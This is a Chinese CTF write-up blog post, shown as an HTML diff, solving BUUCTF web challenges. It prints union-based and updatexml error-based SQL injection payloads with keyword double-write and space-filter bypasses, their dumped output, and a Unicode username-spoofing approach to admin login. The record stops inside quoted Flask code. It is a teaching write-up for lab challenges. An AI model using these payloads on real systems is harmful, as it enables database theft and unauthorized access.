@@ -1,0 +1,566 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+        <title>BUUCTF web记录3 - zyleo&#39;s blog</title><meta name="Description" content=""><meta property="og:title" content="BUUCTF web记录3" />
+<meta property="og:description" content="0x00 [极客大挑战 2019]BabySQL 题目链接 打开题目，还是熟悉的用户名密码注入界面 网站首页image-20210721115109030 &#34; 网站首页 首先判断闭合类" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://1iu2y.github.io/posts/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2021-07-19T17:02:23&#43;08:00" />
+<meta property="article:modified_time" content="2021-07-19T17:02:23&#43;08:00" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="BUUCTF web记录3"/>
+<meta name="twitter:description" content="0x00 [极客大挑战 2019]BabySQL 题目链接 打开题目，还是熟悉的用户名密码注入界面 网站首页image-20210721115109030 &#34; 网站首页 首先判断闭合类"/>
+<meta name="application-name" content="zyleo">
+<meta name="apple-mobile-web-app-title" content="zyleo"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://1iu2y.github.io/posts/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/" /><link rel="prev" href="https://1iu2y.github.io/posts/2021-06-29-%E5%BF%AB%E4%B9%90%E6%9C%AC%E5%B0%B1%E4%B8%8D%E8%AF%A5%E5%BB%89%E4%BB%B7/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "BUUCTF web记录3",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/1iu2y.github.io\/posts\/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3\/"
+        },"genre": "posts","keywords": "CTF, web","wordcount":  2896 ,
+        "url": "https:\/\/1iu2y.github.io\/posts\/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3\/","datePublished": "2021-07-19T17:02:23+08:00","dateModified": "2021-07-19T17:02:23+08:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "zyleo"
+            },"description": ""
+    }
+    </script></head>
+    <body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : '' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="zyleo&#39;s blog">Zyleo&#39;s Blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> 文章 </a><a class="menu-item" href="/tags/"> 标签 </a><a class="menu-item" href="/categories/"> 分类 </a><a class="menu-item" href="/about/"> 关于 </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                    <i class="fas fa-adjust fa-fw"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="zyleo&#39;s blog">Zyleo&#39;s Blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        取消
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">文章</a><a class="menu-item" href="/tags/" title="">标签</a><a class="menu-item" href="/categories/" title="">分类</a><a class="menu-item" href="/about/" title="">关于</a><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                <i class="fas fa-adjust fa-fw"></i>
+            </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">目录</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animated flipInX">BUUCTF web记录3</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="https://github.com/liuliuliuzy" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw"></i>zyleo</a></span>&nbsp;<span class="post-category">收录于 <a href="/categories/ctf/"><i class="far fa-folder fa-fw"></i>CTF</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2021-07-19">2021-07-19</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 2896 字&nbsp;
+                <i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 6 分钟&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  kept="">
+                <div class="details-summary toc-title">
+                    <span>目录</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#0x00-极客大挑战-2019babysql">0x00 [极客大挑战 2019]BabySQL</a>
+      <ul>
+        <li><a href="#参考链接">参考链接：</a></li>
+      </ul>
+    </li>
+    <li><a href="#0x01-极客大挑战-2019hardsql">0x01 [极客大挑战 2019]HardSQL</a>
+      <ul>
+        <li><a href="#参考链接-1">参考链接：</a></li>
+      </ul>
+    </li>
+    <li><a href="#0x02-hctf-2018admin">0x02 [HCTF 2018]admin</a>
+      <ul>
+        <li><a href="#解法1弱密码">解法1：弱密码</a></li>
+        <li><a href="#解法2unicode欺骗">解法2：unicode欺骗</a></li>
+        <li><a href="#解法3-修改flask-session">解法3： 修改flask session</a></li>
+        <li><a href="#参考链接-2">参考链接：</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h2 id="0x00-极客大挑战-2019babysql">0x00 [极客大挑战 2019]BabySQL</h2>
+<p><a href="https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]BabySQL" target="_blank" rel="noopener noreffer">题目链接</a></p>
+<p>打开题目，还是熟悉的用户名密码注入界面</p>
+<p><figure><a class="lightgallery" href="/posts/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210721115109030.png" title="image-20210721115109030" data-thumbnail="/posts/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210721115109030.png" data-sub-html="<h2>网站首页</h2><p>image-20210721115109030</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="image-20210721115109030.png"
+            data-srcset="/posts/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210721115109030.png, image-20210721115109030.png 1.5x, /posts/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210721115109030.png 2x"
+            data-sizes="auto"
+            alt="/posts/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210721115109030.png" />
+    </a><figcaption class="image-caption">网站首页</figcaption>
+    </figure></p>
+<p>首先判断闭合类型，用户名随便写，密码栏填个<code>b'</code>，发现报错，说明查询语句是单引号闭合。</p>
+<p><figure><a class="lightgallery" href="/posts/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210719170507319.png" title="image-20210719170507319" data-thumbnail="/posts/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210719170507319.png" data-sub-html="<h2>报错信息1</h2><p>image-20210719170507319</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="image-20210719170507319.png"
+            data-srcset="/posts/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210719170507319.png, image-20210719170507319.png 1.5x, /posts/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210719170507319.png 2x"
+            data-sizes="auto"
+            alt="/posts/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210719170507319.png" />
+    </a><figcaption class="image-caption">报错信息1</figcaption>
+    </figure></p>
+<p>然后尝试一下密码<code>b' or 1=1 #</code>，发现报错信息中只有<code>'1=1 #''</code>。一开始我也不知道是怎么回事，查阅资料之后才知道，原来有的waf会对<code>or</code>、<code>select</code>等SQL语句关键字做过滤，比如直接替换为空，所以这题要使用<a href="https://blog.csdn.net/m0_51504576/article/details/115832188" target="_blank" rel="noopener noreffer">双写绕过</a>。</p>
+<p><figure><a class="lightgallery" href="/posts/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210719170705563.png" title="image-20210719170705563" data-thumbnail="/posts/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210719170705563.png" data-sub-html="<h2>报错信息2</h2><p>image-20210719170705563</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="image-20210719170705563.png"
+            data-srcset="/posts/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210719170705563.png, image-20210719170705563.png 1.5x, /posts/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210719170705563.png 2x"
+            data-sizes="auto"
+            alt="/posts/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210719170705563.png" />
+    </a><figcaption class="image-caption">报错信息2</figcaption>
+    </figure></p>
+<p>试着使用union查询，输入<code>b' ununionion seselectlect 1,2,3 #</code>，显示成功登录信息，说明被查询的表的列数为3。</p>
+<p><figure><a class="lightgallery" href="/posts/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210721115510406.png" title="image-20210721115510406" data-thumbnail="/posts/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210721115510406.png" data-sub-html="<h2>回显信息</h2><p>image-20210721115510406</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="image-20210721115510406.png"
+            data-srcset="/posts/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210721115510406.png, image-20210721115510406.png 1.5x, /posts/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210721115510406.png 2x"
+            data-sizes="auto"
+            alt="/posts/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210721115510406.png" />
+    </a><figcaption class="image-caption">回显信息</figcaption>
+    </figure></p>
+<p>接下来就是套路化的操作，精髓是使用<code>information_schema</code>等记录数据库自身信息的数据库，以及<code>group_concat()</code>函数。因为看到了2和3的回显，所以把2和3替换为其它表达式可以进行注入。</p>
+<p>懒得放截图，直接把回显结果贴一下。</p>
+<p>首先查看当前数据库</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="n">b</span><span class="s1">&#39; ununionion seselectlect 1,2,database() #
+</span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">Hello 2！
+Your password is &#39;geek&#39;
+</code></pre></td></tr></table>
+</div>
+</div><p>再查看所有数据库</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="n">b</span><span class="s1">&#39; ununionion seselectlect 1,2,group_concat(schema_name)frfromom (infoorrmation_schema.schemata) #
+</span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">Hello 2！
+Your password is &#39;information_schema,mysql,performance_schema,test,ctf,geek&#39;
+</code></pre></td></tr></table>
+</div>
+</div><p>看到一个<code>ctf</code>库，再去爆这个数据库的表</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="n">b</span><span class="s1">&#39; ununionion seselectlect 1,2,group_concat(table_name)frfromom(infoorrmation_schema.tables) whwhereere table_schema=&#34;ctf&#34; #
+</span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">Hello 2！
+Your password is &#39;Flag&#39;
+</code></pre></td></tr></table>
+</div>
+</div><p>其中有个<code>Flag</code>表，然后再去爆字段</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="n">b</span><span class="s1">&#39; ununionion seselectlect 1,2,group_concat(column_name) frfromom (infoorrmation_schema.columns) whwhereere table_name=&#34;Flag&#34;
+</span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">Hello 2！
+Your password is &#39;flag&#39;
+</code></pre></td></tr></table>
+</div>
+</div><p>其中有<code>flag</code>字段，再去爆数据</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="n">b</span><span class="s1">&#39; ununionion seselectlect 1,2,group_concat(flag)frfromom(ctf.Flag)
+</span></code></pre></td></tr></table>
+</div>
+</div><p>拿到flag</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">Hello 2！
+Your password is &#39;flag{b11bfeba-d864-4a0a-97f6-77e3ef266da9}&#39;
+</code></pre></td></tr></table>
+</div>
+</div><p>个人感觉，这题的要点在于数据库本身信息数据库的内容，以及<code>group_concat</code>的使用，双写绕过其实是个很简单的东西。</p>
+<h3 id="参考链接">参考链接：</h3>
+<ul>
+<li>
+<p><a href="https://www.cnblogs.com/kankanhua/p/6484972.html" target="_blank" rel="noopener noreffer">information_schema数据库</a></p>
+</li>
+<li>
+<p><a href="https://www.w3resource.com/mysql/aggregate-functions-and-grouping/aggregate-functions-and-grouping-group_concat.php" target="_blank" rel="noopener noreffer">group_concat()函数</a></p>
+</li>
+</ul>
+<h2 id="0x01-极客大挑战-2019hardsql">0x01 [极客大挑战 2019]HardSQL</h2>
+<p><a href="https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]HardSQL" target="_blank" rel="noopener noreffer">题目链接</a></p>
+<p>可以试出是单引号闭合，但是空格被过滤了，所以使用报错注入</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">b&#39;or(updatexml(1,concat(0x7e,(select(database())),0x7e),1))#
+</code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">XPATH syntax error: &#39;~geek~&#39;
+</code></pre></td></tr></table>
+</div>
+</div><p>找到<code>geek</code>数据库，然后又是类似的程序化操作，爆库、爆表、爆字段、爆数据</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="o">#==</span><span class="err">爆</span><span class="n">geek数据库中的表</span><span class="o">==</span><span class="w">
+</span><span class="w"></span><span class="n">b</span><span class="s1">&#39;or(updatexml(1,concat(0x7e,(select(group_concat(`table_name`,&#39;</span><span class="o">@</span><span class="s1">&#39;))from(information_schema.tables)where(table_schema)like(database())),0x7e),1))#
+</span><span class="s1">
+</span><span class="s1">#==回显结果==
+</span><span class="s1">XPATH syntax error: &#39;</span><span class="o">~</span><span class="n">H4rDsq1</span><span class="o">@~</span><span class="s1">&#39;
+</span><span class="s1">
+</span><span class="s1">#==爆列名==
+</span><span class="s1">b&#39;</span><span class="k">or</span><span class="p">(</span><span class="n">updatexml</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">concat</span><span class="p">(</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,(</span><span class="k">select</span><span class="p">(</span><span class="n">group_concat</span><span class="p">(</span><span class="o">`</span><span class="k">column_name</span><span class="o">`</span><span class="p">,</span><span class="s1">&#39;@&#39;</span><span class="p">))</span><span class="k">from</span><span class="p">(</span><span class="n">information_schema</span><span class="p">.</span><span class="n">columns</span><span class="p">)</span><span class="k">where</span><span class="p">(</span><span class="k">table_name</span><span class="p">)</span><span class="k">like</span><span class="p">(</span><span class="s1">&#39;H4rDsq1&#39;</span><span class="p">)),</span><span class="mi">0</span><span class="n">x7e</span><span class="p">),</span><span class="mi">1</span><span class="p">))</span><span class="o">#</span><span class="w">
+</span><span class="w">
+</span><span class="w"></span><span class="o">#==</span><span class="err">回显结果</span><span class="o">==</span><span class="w">
+</span><span class="w"></span><span class="n">XPATH</span><span class="w"> </span><span class="n">syntax</span><span class="w"> </span><span class="n">error</span><span class="p">:</span><span class="w"> </span><span class="s1">&#39;~id@,username@,password@~&#39;</span><span class="w">
+</span><span class="w">
+</span><span class="w"></span><span class="o">#</span><span class="err">猜测</span><span class="n">flag内容在password字段里</span><span class="w">
+</span><span class="w"></span><span class="o">#==</span><span class="err">爆</span><span class="n">password数据</span><span class="o">==</span><span class="w">
+</span><span class="w"></span><span class="n">b</span><span class="s1">&#39;or(updatexml(1,concat(0x7e,(select`password`from`H4rDsq1`where`password`like(&#39;</span><span class="n">flag</span><span class="err">{</span><span class="o">%</span><span class="s1">&#39;)),0x7e),1))#
+</span><span class="s1">
+</span><span class="s1">#==回显结果==
+</span><span class="s1">XPATH syntax error: &#39;</span><span class="o">~</span><span class="n">flag</span><span class="err">{</span><span class="n">b4541970</span><span class="o">-</span><span class="mi">14</span><span class="n">a3</span><span class="o">-</span><span class="mi">4581</span><span class="o">-</span><span class="n">ae1f</span><span class="o">-</span><span class="mi">30</span><span class="s1">&#39;
+</span><span class="s1">
+</span><span class="s1">#发现只有一半的flag，所以还需要
+</span><span class="s1">#==爆破==
+</span><span class="s1">b&#39;</span><span class="k">or</span><span class="p">(</span><span class="n">updatexml</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">concat</span><span class="p">(</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,</span><span class="k">right</span><span class="p">((</span><span class="k">select</span><span class="o">`</span><span class="n">password</span><span class="o">`</span><span class="k">from</span><span class="o">`</span><span class="n">H4rDsq1</span><span class="o">`</span><span class="k">where</span><span class="o">`</span><span class="n">password</span><span class="o">`</span><span class="k">like</span><span class="p">(</span><span class="s1">&#39;flag{%&#39;</span><span class="p">)),</span><span class="mi">30</span><span class="p">),</span><span class="mi">0</span><span class="n">x7e</span><span class="p">),</span><span class="mi">1</span><span class="p">))</span><span class="o">#</span><span class="w">
+</span><span class="w">
+</span><span class="w"></span><span class="o">#==</span><span class="err">回显结果</span><span class="o">==</span><span class="w">
+</span><span class="w"></span><span class="n">XPATH</span><span class="w"> </span><span class="n">syntax</span><span class="w"> </span><span class="n">error</span><span class="p">:</span><span class="w"> </span><span class="s1">&#39;~0-14a3-4581-ae1f-303399d179f8}~&#39;</span><span class="w">
+</span></code></pre></td></tr></table>
+</div>
+</div><p>这题的主要知识点就是利用<code>updatexml()</code>和<code>extractvalue()</code>函数进行报错注入。使用<code>concat()</code>函数，再加上<code>~</code>或者<code>@</code>等能够引起路径参数报错的字符，将形如<code>concat(0x7e, 语句, 0x7e)</code>这样的结果作为参数，就能够得到<code>XPATH syntax error: '回显结果'</code>这样的报错信息，实现注入。</p>
+<h3 id="参考链接-1">参考链接：</h3>
+<ul>
+<li><a href="https://blog.csdn.net/Xxy605/article/details/116999699" target="_blank" rel="noopener noreffer">https://blog.csdn.net/Xxy605/article/details/116999699</a></li>
+<li><a href="https://blog.csdn.net/weixin_45738112/article/details/105131866" target="_blank" rel="noopener noreffer">SQL报错注入攻击中的updatexml()函数</a></li>
+</ul>
+<h2 id="0x02-hctf-2018admin">0x02 [HCTF 2018]admin</h2>
+<p><a href="https://buuoj.cn/challenges#[HCTF%202018]admin" target="_blank" rel="noopener noreffer">题目链接</a></p>
+<p>这是一道很有趣的题，网站提供了注册、登录、修改密码等功能。</p>
+<p>看源码大致可以感觉到，需要你以<code>admin</code>身份登录，才能够获取flag，但是<code>admin</code>是已经注册过的用户，所以在不知道<code>admin</code>密码的情况下无法登录。</p>
+<p><figure><a class="lightgallery" href="/posts/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210724184059694.png" title="image-20210724184059694" data-thumbnail="/posts/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210724184059694.png" data-sub-html="<h2>源码提示</h2><p>image-20210724184059694</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="image-20210724184059694.png"
+            data-srcset="/posts/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210724184059694.png, image-20210724184059694.png 1.5x, /posts/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210724184059694.png 2x"
+            data-sizes="auto"
+            alt="/posts/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210724184059694.png" />
+    </a><figcaption class="image-caption">源码提示</figcaption>
+    </figure></p>
+<p>查阅一些wp之后，可以得到3种解法。</p>
+<h3 id="解法1弱密码">解法1：弱密码</h3>
+<p>这是很扯的一个解法，可以理解为，机缘巧合，直接试出来了<code>admin</code>的密码是<code>123</code>🤣，登录拿到flag</p>
+<h3 id="解法2unicode欺骗">解法2：unicode欺骗</h3>
+<p>预期解之一。查看网页源码可以看到该web应用是一个flask应用，源码地址为<a href="https://github.com/woadsl1234/hctf_flask" target="_blank" rel="noopener noreffer">https://github.com/woadsl1234/hctf_flask</a></p>
+<p><figure><a class="lightgallery" href="/posts/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210724184719396.png" title="image-20210724184719396" data-thumbnail="/posts/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210724184719396.png" data-sub-html="<h2>改密码界面的源码注释提示</h2><p>image-20210724184719396</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="image-20210724184719396.png"
+            data-srcset="/posts/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210724184719396.png, image-20210724184719396.png 1.5x, /posts/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210724184719396.png 2x"
+            data-sizes="auto"
+            alt="/posts/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210724184719396.png" />
+    </a><figcaption class="image-caption">改密码界面的源码注释提示</figcaption>
+    </figure></p>
+<p>查看源码中的路由逻辑<code>routes.py</code>，其中的<code>login</code>与<code>change</code>路由处理逻辑使用了过时版本twisted框架中的<code>nodeprep.prepare()</code>函数，该函数会将<code>ᴬ</code>转换为<code>A</code>，然后转换为小写的<code>a</code>（这个知识点我也不知道获取的渠道是什么）。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-python" data-lang="python"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/login&#39;</span><span class="p">,</span> <span class="n">methods</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;GET&#39;</span><span class="p">,</span> <span class="s1">&#39;POST&#39;</span><span class="p">])</span>
+<span class="k">def</span> <span class="nf">login</span><span class="p">():</span>
+    <span class="k">if</span> <span class="n">current_user</span><span class="o">.</span><span class="n">is_authenticated</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s1">&#39;index&#39;</span><span class="p">))</span>
+
+    <span class="n">form</span> <span class="o">=</span> <span class="n">LoginForm</span><span class="p">()</span>
+    <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">method</span> <span class="o">==</span> <span class="s1">&#39;POST&#39;</span><span class="p">:</span>
+        <span class="n">name</span> <span class="o">=</span> <span class="n">strlower</span><span class="p">(</span><span class="n">form</span><span class="o">.</span><span class="n">username</span><span class="o">.</span><span class="n">data</span><span class="p">)</span> <span class="o">//&lt;------</span><span class="err">就在这里使用了一个自定义的</span><span class="n">strlower</span><span class="p">()</span><span class="err">函数</span>
+        <span class="n">session</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">name</span>
+        <span class="n">user</span> <span class="o">=</span> <span class="n">User</span><span class="o">.</span><span class="n">query</span><span class="o">.</span><span class="n">filter_by</span><span class="p">(</span><span class="n">username</span><span class="o">=</span><span class="n">name</span><span class="p">)</span><span class="o">.</span><span class="n">first</span><span class="p">()</span>
